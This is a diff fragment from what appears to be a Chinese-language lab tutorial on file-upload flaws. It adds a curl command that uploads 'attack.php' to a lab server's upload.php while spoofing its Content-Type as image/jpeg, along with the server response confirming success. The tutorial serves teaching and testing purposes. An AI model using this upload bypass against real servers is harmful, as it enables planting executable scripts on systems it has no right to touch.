@@ -38,5 +38,28 @@ echo "attack success !!!";
 ?>
 ```
 
+使用 curl 命令上传文件，并将 Content-Type 改成
+
+`image/jpeg`
+
+。
+
+
+
+```
+$ curl 'http://192.168.56.101/upload.php'  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCHKmsM8kfbHlN8Ff' --data-binary $'------WebKitFormBoundaryCHKmsM8kfbHlN8Ff\r\nContent-Disposition: form-data; name="uploadedfile"; filename="attack.php"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryCHKmsM8kfbHlN8Ff--\r\n'
+
+Array
+(
+    [name] => attack.php
+    [type] => image/jpeg
+    [tmp_name] => /home/bitnami-nginxstack/php/tmp/phpjWsmp3
+    [error] => 0
+    [size] => 0
+)
+
+上传成功
+```
+
 
 
